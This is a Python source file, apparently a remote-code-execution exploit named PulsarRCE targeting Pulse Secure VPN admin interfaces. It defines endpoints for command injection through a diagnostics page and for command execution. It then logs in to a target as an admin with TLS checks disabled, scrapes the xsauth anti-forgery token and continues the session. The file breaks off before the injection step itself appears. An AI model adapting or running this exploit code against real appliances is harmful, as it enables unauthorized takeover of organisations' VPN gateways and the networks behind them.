import requests
import urllib3
from colorama import Fore
from bs4 import BeautifulSoup
# Disable Warnings from requests library
urllib3.disable_warnings()


class PulsarRCE:

    def __init__(self, **kwargs):

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        self.cookies = {
            'lastRealm': 'Admin%20Users',
            'DSSIGNIN': 'url_admin',
            'DSSignInURL': '/admin/',
            'DSPERSISTMSG': '',
        }

        self.loginData = {
            'tz_offset': 0,
            'username': None,
            'password': None,
            'realm': 'Admin Users',
            'btnSubmit': 'Sign In',
        }

        self.welcomeURI = "/dana-na/auth/url_admin/welcome.cgi"
        self.CMDInjectURI = "/dana-admin/diag/diag.cgi"
        self.LoginURI = "/dana-na/auth/url_admin/login.cgi"
        self.CMDExecURI = "/dana-na/auth/setcookie.cgi"

        self.authDict = kwargs.get('credentials')
        self.proxies = kwargs.get('proxies')
        self._v = kwargs.get('v')

    def exploit(self, target, credential):

        sesHeaders = self.headers
        sesCookies = self.cookies
        sesLoginData = self.loginData

        s = requests.Session()
        s.proxies.update(self.proxies)  # Set the proxies for the session

        # Initial request to establish session.
        req = requests.get(f"https://{target}{self.welcomeURI}", cookies=sesCookies, headers=self.headers, verify=False,
                           proxies=self.proxies)
        if self._v:
            print(f"{Fore.LIGHTBLACK_EX}[-] Logging into {target}.")
        req = s.post(f"https://{target}{self.LoginURI}", data=sesLoginData, verify=False, allow_redirects=False)

        if req.status_code == 302 and "welcome.cgi" in req.headers.get("location", ""):
            referrer = f"https://{target}{req.headers['location']}"
            req = s.get(referrer, verify=False)
            soup = BeautifulSoup(req.text, 'html.parser')
            formData = soup.find('input', {'id': 'DSIDFormDataStr'})['value']
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[-] Grabbing xsauth on {target}.")
            xsAuth = soup.find('input', {'name': 'xsauth'})['value']
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[+] Found xsauth on {target}: {xsAuth}")
            data = {'btnContinue': 'Continue the session', 'FormDataStr': formData, 'xsauth': xsAuth}  # Form Post Data.
            sesHeaders.update({"Referrer": referrer})
            req = s.post(f"https://{target}{self.LoginURI}", data=data, headers=sesHeaders, verify=False)



